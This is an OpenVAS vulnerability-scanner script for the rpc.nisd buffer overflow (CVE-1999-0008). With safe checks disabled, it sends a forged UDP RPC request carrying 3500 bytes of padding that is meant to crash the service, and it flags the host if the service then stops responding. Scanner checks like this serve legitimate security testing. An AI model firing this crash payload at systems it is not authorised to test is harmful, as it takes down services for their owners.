# OpenVAS Vulnerability Test
# $Id: nisd_overflow.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: rpc.nisd overflow
#
# Authors:
# Renaud Deraison
#
# Copyright:
# Copyright (C) 2002 Renaud Deraison
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote RPC service 100300 (nisd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.";

tag_solution = "disable this service if you don't use it, or apply the relevant patch";

if(description)
{
 script_id(80029);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
 script_bugtraq_id(104);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-1999-0008");
 
 name = "rpc.nisd overflow";
 
 script_name(name);
 

 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 
 script_copyright("This script is Copyright (C) 2002 Renaud Deraison");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("secpod_rpc_portmap.nasl","gather-package-list.nasl");
 script_require_keys("rpc/portmap");
 
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("byte_func.inc");

version = get_kb_item("ssh/login/solosversion");
if ( version && ereg(pattern:"^5\.([7-9]|10)", string:version)) exit(0);

function ping()
{
 req =  raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
    	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
	0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x04) + crap(4);
  soc = open_sock_udp(port);
  if(!soc)exit(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:512);
  if(r) return 1;
  else return 0;
}

port = get_rpc_port(program:100300, protocol:IPPROTO_UDP);
if(port)
{
  if(safe_checks())
  {
  data = " 
The remote RPC service 100300 (nisd) *may* be vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

*** OpenVAS did not actually check for this flaw, so this 
*** might be a false positive

Solution: disable this service if you don't useit, or apply
the relevant patch";
  security_message(port:port, data:data);
  exit(0);
  }
  
  
  if(get_udp_port_state(port))
  {
   if(ping())
   {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
    	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
	0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x09, 0x2C) + crap(3500);


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     
     if(!ping())security_message(port);
   }
   }
 }
}
